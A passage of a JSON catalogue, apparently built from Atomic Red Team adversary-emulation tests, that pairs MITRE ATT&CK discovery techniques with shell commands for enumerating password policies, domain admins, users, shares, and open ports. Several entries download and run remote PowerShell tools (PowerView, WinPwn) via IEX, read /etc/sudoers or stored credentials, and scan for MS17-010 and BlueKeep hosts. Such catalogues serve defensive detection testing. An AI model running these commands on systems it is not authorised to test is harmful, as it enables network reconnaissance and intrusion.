            "command": "df -aH; smbutil view -g //computer1; showmount computer1"
         },
         {
            "description": "Network Share Discovery",
            "command": "Get-SmbShare | ConvertTo-Json"
         },
         {
            "description": "View the shares of a remote host",
            "command": "net view \\\\#{remote.host.fqdn} /all"
         }
      ]
   },
   "T1201": {
      "technique_name": "Password Policy Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Lists the domain password policy to console on Windows.\n",
            "command": "net accounts /domain"
         },
         {
            "description": "Lists the password policy to console on macOS.\n",
            "command": "pwpolicy getaccountpolicies"
         },
         {
            "description": "Lists the password complexity policy to console on CentOS/RHEL 7.x Linux.\n",
            "command": "if [ $(uname -a | grep -ioP 'el[0-9]' | grep -oP '[0-9]') -eq \"7\" ]; then : ; else echo Please run from CentOS or RHEL v7; fi;  ;  cat /etc/security/pwquality.conf"
         },
         {
            "description": "This atomic test will display details about the password policy for the current AWS account.\n",
            "command": "aws iam get-account-password-policy"
         },
         {
            "description": "Lists the password complexity policy to console on CentOS/RHEL 6.x Linux.\n",
            "command": "if [ $(rpm -q --queryformat '%{VERSION}') -eq \"6\" ]; then : ; else echo Please run from CentOS or RHEL v6; fi;  ;  cat /etc/pam.d/system-auth; cat /etc/security/pwquality.conf"
         },
         {
            "description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n",
            "command": "get-addefaultdomainpasswordpolicy"
         },
         {
            "description": "Utilizing PowerView, run Get-DomainPolicy to return the default domain policy or the domain controller policy for the current domain or a specified domain/domain controller.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose"
         },
         {
            "description": "Lists the password complexity policy to console on Ubuntu Linux.\n",
            "command": "cat /etc/pam.d/common-password"
         },
         {
            "description": "SecEdit.exe can be used to export the current local security policy applied to a host.\n[Reference](https://blueteamops.medium.com/secedit-and-i-know-it-595056dee53d)\n",
            "command": "secedit.exe /export /areas SECURITYPOLICY /cfg output_mysecpol.txt"
         },
         {
            "description": "Lists the password expiration policy to console on CentOS/RHEL/Ubuntu.\n",
            "command": "cat /etc/login.defs"
         },
         {
            "description": "Lists the local password policy to console on Windows.\n",
            "command": "net accounts"
         },
         {
            "description": "Password Policy Discovery",
            "command": "pwpolicy getaccountpolicies\n"
         },
         {
            "description": "Password Policy Discovery for a domain",
            "command": "net accounts /domain\n"
         }
      ]
   },
   "T1518": {
      "technique_name": "Software Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powerSQL -noninteractive -consoleoutput"
         },
         {
            "description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n",
            "command": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist; /usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist"
         },
         {
            "description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n",
            "command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion"
         },
         {
            "description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Dotnetsearch -noninteractive -consoleoutput"
         },
         {
            "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); dotnet -consoleoutput -noninteractive"
         },
         {
            "description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
            "command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize; Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize"
         },
         {
            "description": "Check to see what version of python is installed",
            "command": "python3 --version;python2 --version;python --version\n"
         },
         {
            "description": "Check to see if Gooogle Chrome browser is installed",
            "command": "which google-chrome\n"
         },
         {
            "description": "Determine the version of Internet Explorer running",
            "command": "(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Internet Explorer').Version\n"
         },
         {
            "description": "Check to see if GoLang is installed",
            "command": "which go\n"
         }
      ]
   },
   "T1069.002": {
      "technique_name": "Permission Groups Discovery: Domain Groups",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.\nThe test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\n",
            "command": "ldifde.exe -f C:\\Windows\\temp\\atomic_ldifde.txt -p subtree"
         },
         {
            "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
            "command": "net localgroup && net group /domain && net group \"enterprise admins\" /domain && net group \"domain admins\" /domain"
         },
         {
            "description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
            "command": "ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D"
         },
         {
            "description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose"
         },
         {
            "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
            "command": "Get-AdGroup -Filter *"
         },
         {
            "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\""
         },
         {
            "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
            "command": "net groups \"Account Operators\" /doma && net groups \"Exchange Organization Management\" /doma && net group \"BUILTIN\\Backup Operators\" /doma && net group /domai \"Domain Admins\""
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
            "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()"
         },
         {
            "description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
            "command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name"
         },
         {
            "description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
            "command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}"
         },
         {
            "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
            "command": "get-ADPrincipalGroupMembership $env:USERNAME | select name"
         },
         {
            "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\""
         },
         {
            "description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose"
         },
         {
            "description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group)"
         },
         {
            "description": "Use PowerView to query the Active Directory server to determine remote admins",
            "command": "Import-Module .\\powerview.ps1;\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn}\n"
         },
         {
            "description": "Use PowerView to query the Active Directory server to determine remote admins",
            "command": "Import-Module .\\powerview.ps1;\n$backup = \"#{backup.admin.ability}\";\n$userName = \"#{domain.user.name}\";\n$userPassword = \"#{domain.user.password}\";\n$secStringPassword = ConvertTo-SecureString $userPassword -AsPlainText -Force;\n$credObject = New-Object System.Management.Automation.PSCredential ($userName, $secStringPassword);\nGet-NetLocalGroupMember -ComputerName #{remote.host.fqdn} -Credential $credObject\n"
         }
      ]
   },
   "T1124": {
      "technique_name": "System Time Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Displays the current system time via the Windows builtin time command: https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/time\nRecently observed in use in the wild during an incident involving Ursnif malware:\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/dc72f0b557fc63347379be0a33439788256761c8/rules/windows/process_creation/proc_creation_win_system_time_lookup.yml\nhttps://thedfirreport.com/2023/01/09/unwrapping-ursnifs-gifts/\n",
            "command": "time"
         },
         {
            "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n",
            "command": "Get-Date"
         },
         {
            "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n",
            "command": "net time \\\\localhost && w32tm /tz"
         },
         {
            "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n",
            "command": "date"
         },
         {
            "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n",
            "command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2"
         },
         {
            "description": "get current system time (ISO 8601)",
            "command": "date -u +\"%Y-%m-%dT%H:%M:%SZ\"\n"
         }
      ]
   },
   "T1033": {
      "technique_name": "System Owner/User Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Identify System owner or users on an endpoint\n\nUpon successful execution, sh will stdout list of usernames.\n",
            "command": "users; w; who"
         },
         {
            "description": "SocGholish performs whoami discovery commands and outputs the results to a tmp file. \nThe test will generate a filename similar to the random one generated during execution and write the file to AppData\\Temp.\n\nReference: https://redcanary.com/threat-detection-report/threats/socgholish/\n",
            "command": "$TokenSet = @{;   U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ';   N = [Char[]]'0123456789'; }; $Upper = Get-Random -Count 5 -InputObject $TokenSet.U; $Number = Get-Random -Count 5 -InputObject $TokenSet.N; $StringSet = $Upper + $Number; $rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''; $file = \"rad\" + $rad + \".tmp\"; whoami.exe /all >> $env:temp\\$file"
         },
         {
            "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
            "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt"
         },
         {
            "description": "Find existing user session on other computers. Upon execution, information about any sessions discovered will be displayed.",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose"
         },
         {
            "description": "Identify System owner or users on an endpoint.\n\nUpon successful execution, cmd.exe will spawn multiple commands against a target host to identify usernames. Output will be via stdout. \nAdditionally, two files will be written to disk - computers.txt and usernames.txt.\n",
            "command": "cmd.exe /C whoami && wmic useraccount get /ALL && quser /SERVER:\"#{computer_name}\" && quser && qwinsta.exe /server:#{computer_name} && qwinsta.exe && for /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt && @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt"
         },
         {
            "description": "Use the PowerShell environment variables to identify the current logged user.",
            "command": "[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt ; $env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append"
         },
         {
            "description": "Get Service Accounts for a domain",
            "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -SPN | ConvertTo-Json -Depth 1\n"
         },
         {
            "description": "Get Administrator users for a computer",
            "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetUser -AdminCount | ConvertTo-Json -Depth 1\n"
         },
         {
            "description": "Obtain user from current session",
            "command": "whoami\n"
         },
         {
            "description": "Find user running agent",
            "command": "whoami"
         }
      ]
   },
   "T1049": {
      "technique_name": "System Network Connections Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Get a listing of network connections.\n\nUpon successful execution, powershell.exe will execute `get-NetTCPConnection`. Results will output via stdout.\n",
            "command": "Get-NetTCPConnection"
         },
         {
            "description": "Get a listing of network connections.\n\nUpon successful execution, sh will execute `netstat` and `who -a`. Results will output via stdout.\n",
            "command": "netstat; who -a"
         },
         {
            "description": "Get a listing of network connections, domains, domain users, and etc.  \nsharpview.exe located in the bin folder, an opensource red-team tool.\nUpon successful execution, cmd.exe will execute sharpview.exe <method>. Results will output via stdout.\n",
            "command": "$syntaxList = \"Invoke-ACLScanner\", \"Invoke-Kerberoast\", \"Find-DomainShare\" ; foreach ($syntax in $syntaxList) {; C:\\Users\\puma-4\\Desktop\\SharpView.exe $syntax -}"
         },
         {
            "description": "Get a listing of network connections.\n\nUpon successful execution, cmd.exe will execute `netstat`, `net use` and `net sessions`. Results will output via stdout.\n",
            "command": "netstat && net use && net sessions"
         },
         {
            "description": "Find System Network Connections",
            "command": "netstat -anto\n"
         }
      ]
   },
   "T1046": {
      "technique_name": "Network Service Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's \"primary\" IPv4 address first and then scans that address with a /24 netmask.\nThe connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.\n",
            "command": "$ipAddr = \"\"; if ($ipAddr -eq \"\") {;     $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1;     Write-Host \"[i] Using Interface $interface\";     $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress; }; Write-Host \"[i] Base IP-Address for Subnet: $ipAddr\"; $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1); Write-Host \"[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'\"; $ports = 445, 3389; $subnetIPs = 1..254 | ForEach-Object { \"$subnetSubstring$_\" }; foreach ($ip in $subnetIPs) {;     foreach ($port in $ports) {;       try {;           $tcp = New-Object Net.Sockets.TcpClient;           $tcp.ConnectAsync($ip, $port).Wait(200) | Out-Null;       } catch {};       if ($tcp.Connected) {;           $tcp.Close();           Write-Host \"Port $port is open on $ip\";       };     }; }"
         },
         {
            "description": "Scan ports to check for listening ports for the local host 127.0.0.1",
            "command": "nmap 127.0.0.1"
         },
         {
            "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); bluekeep -noninteractive -consoleoutput"
         },
         {
            "description": "Scan ports to check for listening ports.\n\nUpon successful execution, sh will perform a network connection against a single host (192.168.1.1) and determine what ports are open in the range of 1-65535. Results will be via stdout.\n",
            "command": "for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/192.168.1.1/$port) && echo port $port is open ; done"
         },
         {
            "description": "Search for potentially vulnerable web apps (low hanging fruits) using fruit function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); fruit -noninteractive -consoleoutput"
         },
         {
            "description": "Scan ports to check for listening ports with python\n",
            "command": "python3 \"./53b103_T1046.py\" -i 127.0.0.1"
         },
         {
            "description": "Attackers may try to obtain a list of services that are operating on remote hosts and local network infrastructure devices, in order to identify potential vulnerabilities that can be exploited through remote software attacks. They typically use tools to conduct port and vulnerability scans in order to obtain this information.",
            "command": "docker build -t t1046 /root/AtomicRedTeam/atomics/T1046/src/; docker run --name t1046_container  -d -t t1046; docker exec t1046_container ./test.sh"
         },
         {
            "description": "Start MS-RPRN RPC Service Scan using spoolvulnscan function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); spoolvulnscan -noninteractive -consoleoutput"
         },
         {
            "description": "Scan ports to check for listening ports with Nmap.\n\nUpon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.\n",
            "command": "if [ -x \"$(command -v telnet)\" ]; then : ; else (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet); fi; if [ -x \"$(command -v nc)\" ]; then : ; else (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat); fi; if [ -x \"$(command -v nmap)\" ]; then : ; else (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap); fi;  ;  sudo nmap -sS 192.168.1.0/24 -p 80; telnet 192.168.1.1 80; nc -nv 192.168.1.1 80"
         },
         {
            "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); MS17-10 -noninteractive -consoleoutput"
         },
         {
            "description": "Scans the local network for common open ports",
            "command": "Import-Module ./basic_scanner.ps1;\n$ports = @(22, 53, 80, 445);\nGet-NetIPConfiguration | ?{$_.NetAdapter.Status -ne \"Disconnected\"} | Get-NetIPaddress -AddressFamily IPv4 | %{\n    $ipv4 = $_.IPAddress;\n    $prefixLength = $_.PrefixLength;\n    Scan-Netrange -ipv4 $ipv4 -prefixLength $prefixLength -ports $ports;\n};\n"
         },
         {
            "description": "Uses nmap to fingerprint services that were network accessible",
            "command": "nmap -sV -p #{remote.host.port} #{remote.host.ip}\n"
         },
         {
            "description": "Use dropped scanner to find open popular ports",
            "command": "python3 scanner.py -i #{remote.host.ip}\n"
         }
      ]
   },
   "T1087.001": {
      "technique_name": "Account Discovery: Local Account",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "List opened files by user\n",
            "command": "username=$(id -u -n) && lsof -u $username"
         },
         {
            "description": "Show if a user account has ever logged in remotely\n",
            "command": "if [ -x \"$(command -v lastlog)\" ]; then : ; else sudo apt-get install login; exit 1;; fi;  ;  lastlog > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
         },
         {
            "description": "Enumerate logged on users. Upon execution, logged on users will be displayed.\n",
            "command": "query user"
         },
         {
            "description": "Utilize local utilities to enumerate users and groups\n",
            "command": "dscl . list /Groups; dscl . list /Users; dscl . list /Users | grep -v '_'; dscacheutil -q group; dscacheutil -q user"
         },
         {
            "description": "Enumerate all accounts\nUpon execution, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
            "command": "net user && dir c:\\Users\\ && cmdkey.exe /list && net localgroup \"Users\" && net localgroup"
         },
         {
            "description": "View accounts with UID 0\n",
            "command": "grep 'x:0:' /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt 2>/dev/null"
         },
         {
            "description": "(requires root)\n",
            "command": "sudo cat /etc/sudoers > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
         },
         {
            "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
            "command": "net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir C:\\Users\\; get-localgroup; net localgroup"
         },
         {
            "description": "Enumerate all accounts by copying /etc/passwd to another file\n",
            "command": "cat /etc/passwd > /tmp/T1087.001.txt; cat /tmp/T1087.001.txt"
         },
         {
            "description": "Utilize groups and id to enumerate users and groups\n",
            "command": "groups; id"
         },
         {
            "description": "Identify all local users",
            "command": "dscl . list /Users | grep -v '_'\n"
         },
         {
            "description": "Get a list of all local users",
            "command": "cut -d: -f1 /etc/passwd | grep -v '_' | grep -v '#'\n"
         }
      ]
   },
   "T1083": {
      "technique_name": "File and Directory Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Find or discover files on the file system.  Upon successful execution, this test will output the results of all the data discovery commands to a specified file.\n",
            "command": "dir /s c:\\ >> %temp%\\T1083Test1.txt && dir /s \"c:\\Documents and Settings\" >> %temp%\\T1083Test1.txt && dir /s \"c:\\Program Files\\\" >> %temp%\\T1083Test1.txt && dir \"%systemdrive%\\Users\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.*\" >> %temp%\\T1083Test1.txt && dir \"%userprofile%\\Desktop\\*.*\" >> %temp%\\T1083Test1.txt && tree /F >> %temp%\\T1083Test1.txt"
         },
         {
            "description": "Find or discover files on the file system. Upon execution, file and folder information will be displayed.\n",
            "command": "ls -recurse; get-childitem -recurse; gci -recurse"
         },
         {
            "description": "Find or discover files on the file system\n",
            "command": "cd $HOME && find . -print | sed -e 's;[^/]*/;|__;g;s;__|; |;g' > /tmp/T1083.txt; if [ -f /etc/mtab ]; then cat /etc/mtab >> /tmp/T1083.txt; fi; find . -type f -iname *.pdf >> /tmp/T1083.txt; cat /tmp/T1083.txt; find . -type f -name \".*\""
         },
         {
            "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
            "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\"); Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; $UsersFolder = \"$env:homedrive\\Users\\\"; foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; {; foreach ($secondarydirectory in $folderarray);  {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}; }; cat $env:temp\\T1083Test5.txt"
         },
         {
            "description": "Launches the DirLister executable for a short period of time and then exits.\n\nRecently seen used by [BlackCat ransomware](https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/) to create a list of accessible directories and files.",
            "command": "Start-Process \"C:\\Users\\puma-4\\Desktop\\DirLister.exe\"; Start-Sleep -Second 4; Stop-Process -Name \"DirLister\""
         },
         {
            "description": "Find or discover files on the file system\n\nReferences:\n\nhttp://osxdaily.com/2013/01/29/list-all-files-subdirectory-contents-recursively/\n\nhttps://perishablepress.com/list-files-folders-recursively-terminal/\n",
            "command": "ls -a >> /tmp/T1083.txt; if [ -d /Library/Preferences/ ]; then ls -la /Library/Preferences/ > /tmp/T1083.txt; fi; file */* *>> /tmp/T1083.txt; cat /tmp/T1083.txt 2>/dev/null; find . -type f; ls -R | grep \":$\" | sed -e 's/:$//' -e 's/[^-][^\\/]*\\//--/g' -e 's/^/ /' -e 's/-/|/'; locate *; which sh"
         },
         {
            "description": "Locate file that appears in the printer queue",
            "command": "find ~ -type f -name #{host.print.file} 2>/dev/null"
         },
         {
            "description": "Print the current working directory on the system",
            "command": "pwd\n"
         },
         {
            "description": "Find or discover files on the file system",
            "command": "Get-ChildItem -Path #{host.system.path}\n"
         },
         {
            "description": "List contents of current directory",
            "command": "ls\n"
         }
      ]
   },
   "T1069.001": {
      "technique_name": "Permission Groups Discovery: Local Groups",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "This module runs the Windows executable of SharpHound in order to remotely list members of the local Administrators group (SAMR)\n",
            "command": "New-Item -Path \"$env:TEMP\\SharpHound\\\" -ItemType Directory > $null; & \"C:\\Users\\puma-4\\Desktop\\SharpHound.exe\" -d \"$env:UserDnsDomain\" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory \"$env:TEMP\\SharpHound\\\""
         },
         {
            "description": "Permission Groups Discovery\n",
            "command": "if [ -x \"$(command -v dscacheutil)\" ]; then dscacheutil -q group; else echo \"dscacheutil is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v dscl)\" ]; then dscl . -list /Groups; else echo \"dscl is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v groups)\" ]; then groups; else echo \"groups is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v id)\" ]; then id; else echo \"id is missing from the machine. skipping...\"; fi; if [ -x \"$(command -v getent)\" ]; then getent group; else echo \"getent is missing from the machine. skipping...\"; fi; cat /etc/group"
         },
         {
            "description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
            "command": "net localgroup && net localgroup \"Administrators\""
         },
         {
            "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n",
            "command": "wmic group get name"
         },
         {
            "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n",
            "command": "Get-WMIObject Win32_Group"
         },
         {
